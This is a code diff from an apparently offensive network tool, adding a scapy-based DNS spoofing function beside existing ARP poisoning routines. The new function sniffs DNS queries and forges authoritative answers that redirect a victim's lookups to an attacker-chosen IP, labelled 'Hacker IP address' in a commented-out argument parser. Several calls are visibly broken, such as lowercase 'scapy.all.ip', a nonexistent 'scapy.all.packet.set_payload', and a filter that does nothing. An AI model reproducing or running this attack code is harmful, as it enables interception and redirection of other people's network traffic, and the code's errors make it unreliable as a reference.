@@ -115,5 +115,52 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, router_mac):
     arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac)
 
 
-def dnsPoison():
-    print("")
+# def get_arguments():
+#     parser = argparse.ArgumentParser()
+#     parser.add_argument("-w", "--website", dest="website",
+#                         help="Website url")
+#     parser.add_argument("-i", "--ip-address", dest="ip",
+#                         help="Hacker IP address")
+#     options = parser.parse_args()
+#     return options
+
+
+def dns_spoofing(interface, website, ip, spoof_all):
+    # queue = netfilterqueue.NetfilterQueue()
+    # netfilterqueue.QueueHandler.bind(queue_num, callback[, max_len[, range,[sock_len]]])
+
+    dns_packet = scapy.all.sniff(iface=interface, filter ="dst port 53", count = 1)
+
+    if(not spoof_all):
+        if (ip != dns_packet[scapy.all.ip].src):
+            pass
+
+    if scapy.all.DNS in dns_packet:
+        dns_source_ip = dns_packet[0].getlayer(IP).src
+        if dns_packet[0].haslayer(scapy.all.TCP):
+            dns_source_port = dns_packet[0].getlayer(scapy.all.TCP).sport
+        elif dns_packet[0].haslayer(scapy.all.UDP):
+            dns_source_port = dns_packet[0].getlayer(scapy.all.UDP).sport
+        else:
+            pass
+
+        dns_query_id = dns_packet[0].getlayer(scapy.all.DNS).id
+        dns_query_count = dns_packet[0].getlayer(scapy.all.DNS).qdcount
+        dns_destination = dns_packet[0].getlayer(scapy.all.IP).dst
+        dns_query = dns_packet[0].getlayer(scapy.all.DNS).qd.qname
+
+        if dns_packet[0].haslayer(scapy.all.TCP):
+            spoofed_packet = scapy.all.IP(dst= dns_packet[scapy.all.ip].src)/ \
+                             scapy.all.TCP(dport=dns_source_port, sport=dns_packet[scapy.all.TCP].dport) / \
+                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd, \
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
+            scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
+            scapy.all.packet.accept()
+        else:
+            spoofed_packet = scapy.all.IP(dst= dns_packet[scapy.all.ip].src) / \
+                             scapy.all.UDP(dport= dns_source_port, sport = dns_packet[scapy.all.UDP].dport)/\
+                             scapy.all.DNS(id=dns_query_id, qr= 1, aa= 1, qd=dns_packet[scapy.all.DNS].qd,\
+                            an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
+            scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
+            scapy.all.packet.accept()
+
